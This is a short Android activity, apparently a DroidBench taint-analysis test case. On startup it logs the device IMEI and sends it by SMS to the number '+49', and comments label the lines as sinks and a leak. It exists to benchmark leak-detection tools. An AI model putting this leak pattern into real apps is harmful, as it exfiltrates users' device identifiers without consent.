package edu.mit.application_modeling;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;

public class AnotherActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.i("DroidBench", ((MyApplication)getApplication()).imei); //sink
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49", null, ((MyApplication)getApplication()).imei, null, null);  //sink, leak
    }
}
